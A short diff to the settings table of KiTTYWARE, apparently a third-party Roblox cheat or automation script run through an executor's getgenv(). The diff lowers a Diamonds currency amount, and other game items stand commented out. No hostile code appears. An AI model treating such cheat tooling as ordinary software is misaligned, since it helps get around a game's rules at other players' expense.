@@ -16,7 +16,7 @@ getgenv().KiTTYWARE = {
             --{Class = "Pet", Name = "Alien Parasite", Tier = 2, Shiny = false, Amount = 40},
             --{Class = "Potion", Name = "Coins", Tier = 5, Shiny = false, Amount = 6},
             --{Class = "Enchant", Name = "Coins", Tier = 5, Shiny = false, Amount = 2},
-            {Class = "Currency", Name = "Diamonds", Tier = nil, Shiny = false, Amount = 10000000},
+            {Class = "Currency", Name = "Diamonds", Tier = nil, Shiny = false, Amount = 5000000},
             --{Class = "Item", Name = "Gift Bag", Tier = nil, Shiny = false, Amount = 3000},
             --{Class = "Item", Name = "Large Gift Bag", Tier = nil, Shiny = false, Amount = 3000},
             --{Class = "Item", Name = "Charm Stone", Tier = nil, Shiny = false, Amount = 1000},
